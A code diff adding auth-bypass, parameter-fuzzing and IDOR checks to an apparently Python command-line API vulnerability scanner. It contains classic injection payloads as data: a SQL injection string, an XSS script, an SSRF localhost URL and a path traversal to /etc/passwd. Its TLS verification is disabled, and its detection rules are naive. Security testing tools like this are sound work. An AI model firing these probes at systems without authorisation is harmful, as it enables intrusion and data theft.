+        #Simple Auth Bypass
+        attack_url = f"{url.rstrip('/')}/admin"
+        resp = requests.get(attack_url, verify=False)
+        if resp.status_code == 200:
+            click.echo(click.style(f"[!] Successful Auth Bypass. {attack_url} is accessible without token.", fg="green"))
+        
+        #Fuzzing
+        if fuzz:
+            click.echo(click.style(f"[*] Starting parameter fuzzing ...", fg="blue"))
+            payloads = {
+                "sqli": "' OR 1=1",
+                "xss": "<script>alert(1)</script>",
+                "ssrf": "http://127.0.0.1:80",
+                "path_trav": "../../etc/passwd"
+            }
+
+            dummy_endpoint = f"{url.rstrip('/')}/test"
+            for vuln, payload in payloads.items():
+                fuzz_data = {"input": payload}
+                try:
+                    fuzz_resp = requests.post(dummy_endpoint, headers=headers, json=fuzz_data, timeout=5, verify=False)
+                    if fuzz_resp.status_code >= 500 or "error" in fuzz_resp.text.lower():
+                        click.echo(click.style(f"[!] {vuln} vulnerability detected.", fg="green"))
+                except Exception as e:
+                    click.echo(click.style(f"[!] Fuzzing error: {e}", fg="red"))
+        
+        #Exploitation
+        if exploit:
+            click.echo(click.style(f"[*] Starting exploitation ...", fg="blue"))
+
+            #Test
+            dummy_url = f"{url.rstrip('/')}/users/1"
+            idor_resp = requests.get(dummy_url, headers=headers, verify=False)
+            if idor_resp.status_code == 200 and "email" in idor_resp.text:
+                click.echo(click.style(f"[!] IDOR vulnerability detected.", fg="green"))
+
+    except requests.exceptions.RequestException as e:
+        click.echo(click.style(f"[!] Request failed: {e}", fg="red"))
+    
+    click.echo(click.style("[*] API vulnerability scan completed.", fg="blue"))
 
 if __name__ == "__main__":
     cli()
